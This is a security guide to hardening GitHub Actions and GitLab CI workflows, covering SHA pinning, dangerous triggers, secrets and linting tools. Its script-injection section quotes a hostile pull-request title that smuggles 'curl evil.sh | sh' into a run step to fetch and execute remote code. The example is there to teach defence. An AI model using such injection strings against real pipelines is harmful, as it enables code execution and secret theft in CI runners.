# CI/CD hardening (GitHub Actions)

## Safe workflow template
```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          persist-credentials: false
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af # v4.1.0
        with:
          node-version: 22
          cache: npm
      - run: npm ci --ignore-scripts
      - run: npm test
```
SHAs above are examples. Resolve the real SHA for the tag you want (`git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2`) and let Dependabot (`package-ecosystem: github-actions`) keep them updated.

## Script injection
```yaml
# ❌ attacker sets PR title to: a"; curl evil.sh | sh; echo "
- run: echo "${{ github.event.pull_request.title }}"
# ✅
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```
Untrusted fields: issue/PR/comment/review title and body, `head_ref`, commit messages, author names and emails, label names, discussion content, `workflow_run` artifacts.

## Dangerous triggers
- `pull_request_target`, `issue_comment`, `workflow_run`: these run in the base repo context with secrets. Never `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` and then build or run it. If you must, split into an unprivileged `pull_request` job that uploads artifacts and a privileged job that only reads data, never executes it.
- Cache poisoning: don't share caches between untrusted PR jobs and release jobs.

## Secrets
- Use environment-scoped secrets with required reviewers for production deploys.
- OIDC for AWS/GCP/Azure: e.g. `aws-actions/configure-aws-credentials` with `role-to-assume`, and a trust policy condition on `token.actions.githubusercontent.com:sub` = `repo:org/repo:environment:prod`.
- Never print secrets. Beware `env` dumps, `set -x`, and debug logging.

## Tooling
`zizmor` (workflow security linter), `actionlint`, OpenSSF Scorecard action, `step-security/harden-runner` (egress monitoring), Dependabot for actions, `gitleaks`/`trufflehog` secret scanning, GitHub push protection.

## GitLab CI notes
Protected variables and branches. `rules:` to avoid running privileged jobs on fork MRs. Pin `image:` digests and `include:` refs. Use CI_JOB_TOKEN allowlists.
